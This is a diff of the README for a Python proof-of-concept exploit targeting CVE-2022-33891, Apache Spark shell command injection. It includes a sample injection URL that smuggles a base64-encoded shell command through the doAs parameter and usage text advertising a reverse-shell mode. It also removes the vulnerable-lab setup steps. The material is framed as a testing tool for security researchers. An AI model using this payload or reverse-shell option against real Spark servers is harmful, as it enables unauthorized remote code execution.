@@ -5,7 +5,7 @@ A Python POC for exploiting the Apache Spark Shell Command Injection vulnerabili
 
 I did not discover this exploit/vulnerability. I just wanted to make a testing tool for the ethical hacking community ^.^
 
-Script by HuskyHacks, optimized for Arch Linux/hunting by CyberQueenMeg
+Script by HuskyHacks, optimized for Arch Linux/threat hunting/bug bounty by CyberQueenMeg
 
 CVE originally discovered by  Kostya Kortchinsky from Databricks.
 
@@ -22,31 +22,13 @@ http://localhost:8080/?doAs=`echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20b
 ```
 ... sleeps for 10 seconds
 
-
-## Setup
-You need a vulnerable version of Spark that has a single config option changed.
-
-- Install the dependencies: `$ pip3 install -r requirements.txt`
-- Change directories into the `spark/` directory.
-- Use the provided `docker-compose.yml` in the `spark/` directory and run `docker-compose up`. Let the container spin up.
-- In a new terminal, enter `sudo docker exec -it spark_spark_1 /bin/bash`
-- In the container bash session, enter: `echo "spark.acls.enable       true" >> conf/spark-defaults.conf`
-- Optionally, cat the contents of spark-defaults.conf to make sure it looks good.
-- Exit the interactice bash shell and Ctl-C your docker-compose process.
-- Once the containers have powered down gracefully, rerun `docker-compose up`
-
-
 ## Usage
 ```
-┌──(kali㉿kali)-[~/Desktop]
-└─$ python3 poc.py -h
-usage: poc.py [-h] -u URL -p PORT [--revshell]
-              [-lh LISTENINGHOST] [-lp LISTENINGPORT]
-              [--check] [--verbose]
+usage: poc.py [-h] -u URL -p PORT [--revshell] [-lh LISTENINGHOST] [-lp LISTENINGPORT] [--check] [--verbose] --header HEADER
 
 CVE-2022-33891 Python POC Exploit Script
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   -u URL, --url URL     URL to exploit.
   -p PORT, --port PORT  Exploit target's port.
@@ -55,9 +37,9 @@ optional arguments:
                         Your listening host IP address.
   -lp LISTENINGPORT, --listeningport LISTENINGPORT
                         Your listening host port.
-  --check               Checks if the target is
-                        exploitable with a sleep test
+  --check               Checks if the target is exploitable with a sleep test
   --verbose             Verbose mode
+  --header HEADER       Custom header
 
 ```
 
